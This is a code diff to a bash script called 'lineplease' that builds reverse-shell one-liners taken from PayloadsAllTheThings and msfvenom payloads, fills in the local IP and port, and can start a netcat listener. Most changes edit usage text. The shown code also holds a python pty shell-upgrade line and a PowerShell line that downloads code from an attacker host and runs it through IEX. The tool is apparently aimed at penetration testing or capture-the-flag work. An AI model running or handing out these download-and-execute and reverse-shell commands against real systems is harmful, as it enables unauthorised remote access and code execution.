@@ -80,20 +80,20 @@ create_venom() {
 
 display_msg() {
 	printf "\nfor reverse shell line
-usage:          ./lineplease [options] [interface] [port]
-example:        ./lineplease -b eth0 1337
+usage:          ./lineplease.sh [options] [interface] [port]
+example:        ./lineplease.sh -b eth0 1337
 
 y to copy line to clipboard/any other key to continue
 y to start netcat listener/any other key to exit
 
 for msfvenom
-usage:          ./lineplease [options] [interface] [port] [name]
-example:        ./lineplease -m1 tun0 1337 rev
+usage:          ./lineplease.sh [options] [interface] [port] [name]
+example:        ./lineplease.sh -m1 tun0 1337 rev
 
 y to create file/any other key to exit
 
 -h for help
-example:        ./lineplease -h | grep bash\n\n"
+example:        ./lineplease.sh -h | grep bash\n\n"
 exit
 }
 
@@ -133,8 +133,8 @@ printf "author: rub3rth\n\n"
 printf "oneliners from PayLoadAllTheThings\n"
 printf "https://github.com/swisskyrepo/PayloadsAllTheThings\n\n"
 printf "\nfor reverse shell line
-usage: 		./lineplease [options] [interface] [port]
-example: 	./lineplease -b eth0 1337
+usage: 		./lineplease.sh [options] [interface] [port]
+example: 	./lineplease.sh -b eth0 1337
 
 (ipv4-address on desired interface is inserted into line)
 
@@ -142,13 +142,13 @@ when prompted:  y to copy line to clipboard or any other key to continue (requir
 		y to start netcat listener or any other key to exit
 
 for msfvenom (requires msfvenom):
-usage: 		./lineplease [options] [interface] [port] [name]
-example: 	./lineplease -m2 tun0 1337 rev
+usage: 		./lineplease.sh [options] [interface] [port] [name]
+example: 	./lineplease.sh -m2 tun0 1337 rev
 
 when prompted: 	y to create file or any other key to exit
 
 -h 		display this page
-example:	./lineplease -h | grep bash
+example:	./lineplease.sh -h | grep bash
 
 options:
 
@@ -263,6 +263,7 @@ PL3=$(echo "python3 -c 'import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
 printf "$PL3"
 printf "\n\n		loads up line for python shell upgrade
 		usage:		./lineplease.sh -pl2\n
+		when prompted:  y to copy to clipboard (requires xsel)/any other key to exit
 -psd		"
 PSD=$(echo "powershell ~IEX(New-Object Net.WebClient).downloadString('http://[ip]:[port]/[filename]')~" | sed s/\~/\"/g)
 printf "$PSD"
